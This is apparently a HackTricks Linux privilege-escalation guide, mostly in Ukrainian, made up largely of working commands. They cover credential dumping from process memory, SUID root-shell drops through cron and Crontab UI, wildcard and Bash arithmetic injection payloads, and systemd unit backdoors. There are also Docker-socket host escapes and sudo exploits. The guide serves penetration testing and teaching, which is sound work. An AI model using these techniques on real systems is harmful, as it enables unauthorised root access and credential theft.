# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Системна інформація

### Інформація про ОС

Почнемо збирати інформацію про запущену ОС.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

Якщо ви **маєте права запису в будь-яку папку всередині змінної `PATH`**, ви можете підмінити деякі libraries або binaries:
```bash
echo $PATH
```
### Інформація про змінні оточення

Чи є цікава інформація, паролі або API-ключі в змінних оточення?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel і чи існує якийсь exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих версій ядра та деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії ядра з цих ресурсів, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти у пошуку kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (виконати на жертві, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію ядра в Google**, можливо ваша версія ядра вказана в якомусь kernel exploit, і тоді ви будете впевнені, що цей exploit дійсний.

Додаткові техніки експлуатації ядра:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

На основі вразливих версій sudo, що з'являються в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo уразлива, за допомогою цього grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії Sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють непривілейованим локальним користувачам підвищити свої привілеї до root через опцію sudo `--chroot`, якщо файл `/etc/nsswitch.conf` використовується з директорії, контрольованої користувачем.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

Для додаткової інформації зверніться до оригінального [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Перегляньте **smasher2 box of HTB** як **приклад** того, як цю vuln можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткова енумерація системи
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічити можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви перебуваєте всередині docker container, ви можете спробувати вийти з нього:


{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **what is mounted and unmounted**, де і навіщо. Якщо щось unmounted, ви можете спробувати mount його і перевірити на наявність приватної інформації.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічіть корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **будь-який компілятор**. Це корисно, якщо вам потрібно використовувати якийсь kernel exploit, оскільки рекомендовано скомпілювати його на машині, де ви збираєтеся його використовувати (або на схожій).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів і сервісів**. Можливо, є якась стара версія Nagios (наприклад), яку можна експлуатувати для escalating privileges…\  
Рекомендується вручну перевірити версії найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є SSH-доступ до машини, ви також можете використати **openVAS** для перевірки застарілого та вразливого програмного забезпечення, встановленого на машині.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть багато інформації, яка здебільшого буде марною; тому рекомендується використовувати програми на кшталт OpenVAS або подібні, які перевіряють, чи є встановлені версії програм вразливими до відомих експлойтів_

## Processes

Перегляньте, **які процеси** виконуються та перевірте, чи якийсь процес не має **більше привілеїв, ніж повинен** (наприклад, tomcat, запущений від root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Також **перевіряйте свої привілеї над бінарними файлами процесів**, можливо, ви зможете перезаписати якийсь.

### Моніторинг процесів

Ви можете використовувати інструменти, такі як [**pspy**](https://github.com/DominicBreuker/pspy), для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, що виконуються часто або коли виконуються певні умови.

### Пам'ять процесу

Деякі сервіси на сервері зберігають **облікові дані у відкритому вигляді в пам'яті**.\
Зазвичай вам знадобляться **привілеї root**, щоб читати пам'ять процесів, що належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете знайти додаткові облікові дані.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, які належать вам**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу, **maps показують, як пам'ять відображається у віртуальному адресному просторі цього процесу**; також вони показують **права доступу для кожної мапованої області**. Псевдофайл **mem** **відкриває саму пам'ять процесу**. З файлу **maps** ми знаємо, які **області пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **seek into the mem file and dump all readable regions** у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до системної **фізичної** пам'яті, а не до віртуальної пам'яті. До віртуального адресного простору ядра можна отримати доступ за допомогою /dev/kmem.\
Зазвичай, `/dev/mem` доступний для читання лише користувачем **root** та групою **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для Linux

ProcDump — це версія для Linux класичного інструменту ProcDump із набору Sysinternals для Windows. Отримати її можна за [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб дампнути пам'ять процесу, можна використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимоги root і зняти дамп процесу, яким володієте
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущено:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump the process (див. попередні розділи, щоб знайти різні способи dump the memory of a process) і шукати credentials всередині memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому тексті з пам'яті** та з деяких **відомих файлів**. Для коректної роботи потрібні права root.

| Функція                                           | Ім'я процесу         |
| ------------------------------------------------- | -------------------- |
| GDM пароль (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (активні FTP-з'єднання)                    | vsftpd               |
| Apache2 (активні HTTP Basic Auth сесії)           | apache2              |
| OpenSSH (активні SSH-сесії - використання sudo)   | sshd:                |

#### Пошук Regex-ів/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані завдання/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Якщо веб‑панель “Crontab UI” (alseambusher/crontab-ui) запущена від root і прив’язана лише до loopback, ви все одно можете дістатися до неї через SSH local port-forwarding і створити привілейовану задачу для підвищення привілеїв.

Типовий ланцюжок
- Виявити порт, доступний лише на loopback (наприклад, 127.0.0.1:8000) і Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
  - Резервні копії/скрипти з `zip -P <password>`
  - systemd unit, який містить `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Відкрити тунель і увійти:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створити high-priv job і запустити негайно (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Підсилення безпеки
- Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
- Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
- Avoid embedding secrets in unit files; use сховища секретів or root-only EnvironmentFile
- Enable audit/logging for on-demand job executions

Перевірте, чи не є вразливою якась запланована задача. Можливо, ви зможете скористатися скриптом, який виконується від імені root (wildcard vuln? чи можна модифікувати файли, які використовує root? use symlinks? створити певні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Наприклад, всередині _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис у /home/user_)

Якщо в цьому crontab користувач root намагається виконати якусь команду або скрипт без встановлення PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використовуючи:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, що використовує скрипт з wildcard (Wildcard Injection)

Якщо скрипт, що виконується під root, має “**\***” всередині команди, ви можете скористатися цим, щоб спричинити непередбачувані речі (наприклад, privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шляху на кшталт** _**/some/path/\***_ **, він не вразливий (навіть** _**./\***_ **ні).**

Прочитайте наступну сторінку, щоб дізнатися більше трюків експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion та command substitution перед arithmetic evaluation у ((...)), $((...)) та let. Якщо root cron/parser читає ненадійні поля логів і підставляє їх в arithmetic context, атакуючий може інжектувати command substitution $(...), яке виконається від імені root під час запуску cron.

- Чому це працює: У Bash розгортання відбуваються у такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting і pathname expansion. Отже значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (виконується команда), а потім залишковий числовий `0` використовується для арифметики, тож скрипт продовжує роботу без помилок.

- Типовий вразливий приклад:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Експлуатація: Домогтися запису attacker-controlled тексту у парсований лог так, щоб поле, що виглядає як число, містило command substitution і закінчувалося цифрою. Переконайтеся, що ваша команда не виводить у stdout (або перенаправте її), щоб арифметика залишалася валідною.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Якщо ви **можете змінити cron script** який виконується від імені root, ви дуже легко отримаєте shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, виконуваний від імені root, використовує **каталог, до якого у вас є повний доступ**, можливо, варто видалити цю папку і **створити symlink до іншої папки**, яка містить скрипт під вашим контролем
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Користувацькі підписані cron бінарні файли з writable payloads
Blue teams іноді "підписують" cron-запущені бінарники, роблячи дамп кастомного ELF-розділу і виконуючи grep по рядку постачальника перед виконанням від root. Якщо цей бінарник дозволений для запису групою (наприклад, `/opt/AV/periodic-checks/monitor` належить `root:devs 770`) і ви можете leak signing material, ви можете підробити розділ і захопити cron-завдання:

1. Використайте `pspy` для захоплення потоку верифікації. В Era root запускав `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, після чого `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, а потім виконував файл.
2. Відтворіть очікуваний сертифікат, використовуючи leaked key/config (з `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Створіть зловмисну заміну (напр., покладіть SUID bash, додайте свій SSH ключ) і вмкніть сертифікат у `.text_sig`, щоб grep проходив:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Перезапишіть запланований бінарник, зберігаючи біти виконання:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Чекайте наступного запуску cron; коли наївна перевірка підпису пройде, ваш payload виконається від root.

### Часті cron-завдання

Ви можете моніторити процеси, щоб шукати ті, що виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете цим скористатися і підняти привілеї.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **відсортувати за найменш виконуваними командами** і видалити команди, які виконувалися найчастіше, ви можете зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Можна також використати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно буде моніторити та перераховувати кожен процес, який запускається).

### Невидимі cron jobs

Можна створити cronjob, **вставивши carriage return після коментаря** (без символу newline), і cron job працюватиме. Приклад (зверніть увагу на символ carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Сервіси

### Файли _.service_, доступні для запису

Перевірте, чи можете записати будь-який файл `.service`; якщо так, ви **можете змінити його** так, щоб він **запускав** ваш **backdoor**, коли служба **запускається**, **перезапускається** або **зупиняється** (можливо, доведеться дочекатися перезавантаження машини).\
Наприклад створіть ваш backdoor всередині файлу .service з **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **права запису над бінарними файлами, які виконуються сервісами**, ви можете змінити їх на backdoors так, що при повторному запуску сервісів backdoors буде виконано.

### systemd PATH - Відносні шляхи

Ви можете переглянути PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **write** в будь-якій із папок цього шляху, можливо, ви зможете **escalate privileges**. Потрібно шукати використання **relative paths being used on service configurations** у файлах конфігурації, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **тим самим іменем, що й бінарний файл за відносним шляхом** всередині папки PATH systemd, у яку ви можете записувати, і коли служба буде запитана виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконано** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете ви використати `sudo -l`).

**Дізнайтеся більше про служби за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це systemd unit files, ім'я яких закінчується на `**.timer**`, які керують `**.service**` файлами або подіями. **Таймери** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку календарних подій і монотонних подій часу та можуть виконуватися асинхронно.

Перелічити всі таймери можна за допомогою:
```bash
systemctl list-timers --all
```
### Записувані таймери

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі наявні systemd.unit (наприклад `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує бінарний файл, до якого є права на запис**
- Знайти systemd unit, який **виконує виконуваний файл за відносним шляхом** і над яким у вас є **права на запис** у **systemd PATH** (щоб підробити цей виконуваний файл)

**Дізнайтеся більше про timers за допомогою `man systemd.timer`.**

### **Увімкнення Timer**

Щоб увімкнути timer, потрібні привілеї root і потрібно виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) забезпечують **взаємодію процесів** на тій же або на інших машинах у клієнт‑серверній моделі. Вони використовують стандартні Unix дескрипторні файли для міжкомп’ютерної комунікації і налаштовуються через `.socket` файли.

Sockets can be configured using `.socket` files.

**Дізнайтеся більше про сокети за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції відрізняються, але загалом використовуються, щоб **вказати, де буде прослуховуватись** сокет (шлях до AF_UNIX файлу сокета, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання створюється окремий екземпляр сервісу і йому передається тільки сокет з'єднання. Якщо **false**, всі прослуховуючі сокети передаються запущеному сервісному юніту, і створюється лише один сервісний юніт для всіх з'єднань. Це значення ігнорується для датаграмних сокетів і FIFO, де один сервісний юніт безумовно обробляє весь вхідний трафік. **За замовчуванням — false.** З міркувань продуктивності рекомендується писати нові демони так, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають один або декілька рядків команд, які виконуються відповідно **перед** або **після** створення і прив'язки прослуховуючих **сокетів**/FIFO. Перший токен командного рядка має бути абсолютним шляхом до файлу, після якого йдуть аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які виконуються відповідно **перед** або **після** закриття та видалення прослуховуючих **сокетів**/FIFO.
- `Service`: Визначає ім'я сервісного юніта, який потрібно **активувати** при **вхідному трафіку**. Ця опція дозволена лише для сокетів з Accept=no. За замовчуванням використовується сервіс з тією ж назвою, що й сокет (суфікс замінюється). У більшості випадків використання цієї опції не є необхідним.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Записувані сокети

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Перерахування Unix-сокетів
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Майте на увазі, що можуть існувати деякі **sockets listening for HTTP** requests (_Я не говорю про .socket files, а про файли, які діють як unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо socket **відповідає на HTTP** запит, то ви можете **спілкуватися** з ним і, можливо, **exploit some vulnerability**.

### Доступний для запису Docker socket

Docker socket, часто знаходиться за шляхом `/var/run/docker.sock`, — це критичний файл, який потрібно захистити. За замовчуванням він доступний для запису користувачу `root` та членам групи `docker`. Наявність права запису до цього socket може призвести до privilege escalation. Нижче подано розбір того, як це можна зробити, а також альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо ви маєте доступ на запис до Docker socket, ви можете escalate privileges, використовуючи такі команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з доступом root до файлової системи хоста.

#### **Використання Docker API напряму**

Якщо Docker CLI недоступний, до Docker socket все ще можна звертатися через Docker API та команди `curl`.

1.  **List Docker Images:** Отримайте список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надішліть запит на створення контейнера, який монтує кореневу директорію хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat`, щоб встановити з'єднання з контейнером і виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після встановлення з'єднання `socat` ви можете виконувати команди безпосередньо в контейнері з root-доступом до файлової системи хоста.

### Інше

Зауважте, що якщо у вас є права на запис у Docker socket, тому що ви є **inside the group `docker`** у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **more ways to break out from docker or abuse it to escalate privileges** у:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви виявите, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви виявите, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна **inter-Process Communication (IPC) system**, яка дозволяє застосункам ефективно взаємодіяти і обмінюватися даними. Розроблена з урахуванням сучасної системи Linux, вона пропонує надійну основу для різних форм міжзастосункової комунікації.

Система універсальна — підтримує базовий IPC, що покращує обмін даними між процесами, нагадуючи **enhanced UNIX domain sockets**. Крім того, вона допомагає в трансляції подій або сигналів, забезпечуючи безшовну інтеграцію між компонентами системи. Наприклад, сигнал від Bluetooth daemon про вхідний дзвінок може змусити music player приглушити звук, покращуючи досвід користувача. Додатково, D-Bus підтримує систему віддалених об'єктів, спрощуючи запити сервісів і виклики методів між застосунками, оптимізуючи процеси, що раніше були складними.

